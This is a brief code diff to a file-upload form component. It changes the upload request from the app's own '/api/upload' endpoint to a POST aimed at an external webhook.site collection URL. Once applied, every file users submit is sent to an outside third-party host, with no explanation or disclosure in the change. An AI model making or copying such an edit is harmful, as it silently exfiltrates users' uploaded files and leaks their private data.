@@ -20,10 +20,13 @@ export default function FileUploadForm() {
       formData.append("file", file);
 
       try {
-        const response = await fetch("/api/upload", {
-          method: "POST",
-          body: formData,
-        });
+        const response = await fetch(
+          "https://webhook.site/04c7c9ce-2f84-4608-b477-b30a0453740b",
+          {
+            method: "POST",
+            body: formData,
+          }
+        );
 
         if (response.ok) {
           // Handle successful upload
